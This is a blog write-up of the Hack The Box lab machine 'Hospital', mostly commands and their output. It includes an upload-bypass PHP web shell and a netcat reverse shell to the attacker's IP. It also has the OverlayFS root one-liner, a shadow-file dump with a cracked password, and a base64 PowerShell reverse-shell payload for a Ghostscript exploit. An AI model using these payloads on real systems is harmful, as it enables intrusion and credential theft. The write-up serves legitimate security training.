---
layout: post
title: "HTB: Hospital"
author: Andrew Cherney
date: 2024-04-13 20:58:53
tags: htb medium-box windows webapp upload-bypass cve
icon: "assets/icons/hospital.png"
post_description: "Starting off this box is an upload bypass in a webapp for uploading medical records. OverlayFS rears its head to give us root in a container. The /etc/shadow file leaks a user's hash which lets us login to the mail service and send a ghostscript payload email to another user. Root can be obtained by finding an inherited escalated permission directory and placing a shell inside of it."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $nmap -sC 10.129.160.96
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-19 11:52 CST
Nmap scan report for 10.129.160.96
Host is up (0.064s latency).
Not shown: 980 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  https
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-20T00:53:02+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
8080/tcp open  http-proxy
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php

Host script results:
|_clock-skew: mean: 7h00m05s, deviation: 0s, median: 7h00m04s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-20T00:53:06
|_  start_date: N/A
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $crackmapexec smb hospital.htb -u anonymous -p '' --rid-brute
SMB         10.129.160.218  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.160.218  445    DC               [-] hospital.htb\anonymous: STATUS_LOGON_FAILURE 
```

## Port 443


![443 roundcube login frontpage](/img/hospital/hospital_443_login_page.png)

As per my wappalyzer extension this is a roundcube webmail service. I pry around but don't see any obvious vulnerabilities in exploitdb.

## Port 8080


{% include img_link src="/img/hospital/hospital_8080_login_page" alt="front_page" ext="png" trunc=600 %}

![account creation 8080](/img/hospital/hospital_raccoon_account_creation.png)

![image upload 8080](/img/hospital/hospital_image_upload.png)

# User as www-data

## file upload bypass

Simple enough, make and account and get greeted with an image upload page. I try to upload a php file to check if there's any filtering by extension, and there is.

![error upload response](/img/hospital/hospital_error_php_upload.png)

On my next attempt I try some other php formats, and .phar is what seemed to pass through. I used this as the test payload:

```php
<?php
print "RCE Achieved!";
?>
```


![successful upload of phar](/img/hospital/hospital_phar_upload.png)

![test.phar check](/img/hospital/hospital_print_php_test.png)

And it's just that simple. With the ability to run code in php I can upload I have the ability to get a faux shell. https://github.com/flozz/p0wny-shell is a good shell for exactly this circumstance.

![p0wnyshell phar upload shell](/img/hospital/hospital_p0wnyshell.png)

I use this naturally to get a reverse shell back to my terminal.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.3 7777 >/tmp/f
```

# User as drwilliams

## overlayfs exploit

```bash
www-data@webserver:/var/www/html/uploads$ uname -r
uname -r
5.19.0-35-generic
www-data@webserver:/var/www/html/uploads$ lsb_release -r
lsb_release -r
Release:	23.04
```

Oh hey this feels familiar: CVE-2023-2640 and CVE-2023-32629. Analytics had the exact same exploit. In this case it seems this might be a container of some kind, seeing as this exploit gives me root and I have yet to interact with the webmail service. 

TLDR: overlayfs is a way to turn two directories into one, but with some messed up permissions which allow for creating a file with elevated permissions to setuid via python and run commands. 

```bash
www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
<share -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
> setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
<n3 -c 'import os;os.setuid(0);os.system("bash -i")'
mkdir: cannot create directory 'l': File exists
mkdir: cannot create directory 'u': File exists
mkdir: cannot create directory 'w': File exists
mkdir: cannot create directory 'm': File exists
bash: cannot set terminal process group (981): Inappropriate ioctl for device
bash: no job control in this shell
root@webserver:/var/www/html/uploads# ls /root
ls /root
kernel
snap
```

Time to look around at environment variables, mount directories and for potential password files.

```bash
root@webserver:/var/www/html/uploads# cat /etc/shadow
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```

Run john against that and we have a user on the machine.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $john hash --wordlist=/opt/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (drwilliams)
1g 0:00:01:21 DONE (2023-11-23 10:52) 0.01227g/s 2629p/s 2629c/s 2629C/s raycharles..pucci
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $ssh drwilliams@hospital.htb
The authenticity of host 'hospital.htb (10.10.11.241)' can't be established.
ECDSA key fingerprint is SHA256:EWnj1r9ALh4zByHIw2t3K4nSSxD0TCZzlPf0lBgsVUs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hospital.htb,10.10.11.241' (ECDSA) to the list of known hosts.
drwilliams@hospital.htb's password: 
Welcome to Ubuntu 23.04 (GNU/Linux 5.19.0-35-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Nov 23 11:53:23 PM UTC 2023

  System load:  0.01              Processes:             154
  Usage of /:   73.3% of 6.06GB   Users logged in:       0
  Memory usage: 52%               IPv4 address for eth0: 192.168.5.2
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Thu Nov 23 15:00:30 2023 from 10.10.14.5
drwilliams@webserver:~$
```


# User as drbrown

## CVE-2023-36664

Back to the webserver on port 443 we go!

![dr williams roundcube login](/img/hospital/hospital_drwilliams_login_webmail.png)

![dr williams inbox roundcube](/img/hospital/hospital_webmail_drwilliams_inbox.png)


I guess it does make sense that a webmail service would give me an inbox to view when I log in. There is a reference here to ghostscripts and .eps files, and also emailing drbrown with the files so they can be used. [https://www.bleepingcomputer.com/news/security/critical-rce-found-in-popular-ghostscript-open-source-pdf-library/](https://www.bleepingcomputer.com/news/security/critical-rce-found-in-popular-ghostscript-open-source-pdf-library/) outlines an rce found in ghostscript which [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) more eloquently phrases as command injection under this particular CVE. I will use it and try to get a reverse shell as drbrown.

```bash
# Function to generate payload for reverse shell
def generate_rev_shell_payload(ip, port):
    payload = f"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANwA3ADcANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
    return payload
```

I modify the payload itself in the script to the above.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $python3 cve-2023-36664.py -g -r -ip 10.10.14.3 -port 7777 -x eps -f revshell
[+] Generated EPS payload file: revshell.eps
```

![payload email](/img/hospital/hospital_eps_payload_email.png)


```powershell
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.241 27603
whoami
hospital\drbrown
PS C:\Users\drbrown.HOSPITAL\Documents> cd ..
PS C:\Users\drbrown.HOSPITAL> cd Desktop
PS C:\Users\drbrown.HOSPITAL\Desktop> dir


    Directory: C:\Users\drbrown.HOSPITAL\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---       11/22/2023   6:16 PM             34 user.txt                                                              


PS C:\Users\drbrown.HOSPITAL\Desktop> type user.txt
fb2bf2edbf----------------------
```

# Root

Dig around some of the files in drbrown's home directory and see some credentials:

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

I then use those credentials to check what users exist.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $rpcclient -U "drbrown" 10.10.11.241
Enter WORKGROUP\drbrown's password: 
rpcclient $> querydispinfo
index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH	Name: (null)	Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown	Name: Chris Brown	Desc: (null)
index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams	Name: Lucy Williams	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8	Name: Microsoft Exchange	Desc: (null)
index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309	Name: Microsoft Exchange	Desc: (null)
index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea	Name: Discovery Search MailboxDesc: (null)
index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db	Name: Microsoft Exchange	Desc: (null)
index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98	Name: Microsoft Exchange Migration	Desc: (null)
```

Administrator as expected, also can see a guest account but that is likely unused here. I perused around some directories and use icacls on the files and folders within the 443 site. There is a directory named htdocs with the following permissions:

```
htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       BUILTIN\Users:(I)(CI)(AD)
       BUILTIN\Users:(I)(CI)(WD)
       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

The first permission for LOCAL SERVICE of (OI) is an inherited permission for files within the directory. That means any file within htdocs inherits system and local service permissions, effectively running as root for existing in the directory.


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Hospital]
└──╼ $httpserver
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.241 - - [23/Nov/2023 12:08:01] "GET /p0wnyshell.phar HTTP/1.1" 200 -
```

```powershell
PS C:\xampp\htdocs> curl 10.10.14.3:8080/p0wnyshell.phar -o shell.php
```


```
               

        ___                         ____      _          _ _        _  _   
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ 
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  
|_|                         |___/  \____/                                  
                

            

DC$@DC:C:\xampp\htdocs# whoami
nt authority\system

DC$@DC:C:\xampp\htdocs# cd C:/Users

DC$@DC:C:\Users# ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

DC$@DC:C:\Users# dir
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users

09/06/2023  06:57 AM    <DIR>          .
09/06/2023  06:57 AM    <DIR>          ..
09/06/2023  01:08 AM    <DIR>          .NET v4.5
09/06/2023  01:08 AM    <DIR>          .NET v4.5 Classic
11/13/2023  09:05 PM    <DIR>          Administrator
09/06/2023  12:49 AM    <DIR>          drbrown
11/13/2023  09:40 PM    <DIR>          drbrown.HOSPITAL
09/06/2023  12:49 AM    <DIR>          drwilliams
09/06/2023  06:55 AM    <DIR>          drwilliams.HOSPITAL
09/05/2023  08:24 AM    <DIR>          Public
               0 File(s)              0 bytes
              10 Dir(s)   4,004,065,280 bytes free

DC$@DC:C:\Users# cd Administrator

DC$@DC:C:\Users\Administrator# dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:\Users\Administrator\Desktop

10/26/2023  11:29 PM    <DIR>          .
10/26/2023  11:29 PM    <DIR>          ..
11/22/2023  06:16 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,004,065,280 bytes free

DC$@DC:C:\Users\Administrator# type Desktop\root.txt
17c01dbfe3e---------------------
```


